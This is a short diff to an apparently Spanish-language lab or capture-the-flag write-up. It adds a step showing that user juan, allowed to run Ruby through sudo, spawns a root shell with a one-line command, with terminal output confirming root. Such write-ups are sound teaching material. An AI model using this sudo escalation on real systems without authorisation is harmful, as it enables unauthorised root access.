@@ -142,6 +142,13 @@ Tenemos permisos para utilizar /usr/bin/ruby con permisos de root siendo juan.
 ```bash
 sudo ruby -e 'exec "/bin/sh"'
 ```
+Ejecutamos el comando y obtenemos privilegios como root.
+```
+juan@5fcb0f7841a2:/var/mail/camilo$ sudo ruby -e 'exec "/bin/sh"'
+# whoami
+root
+#
+```
 
 
 
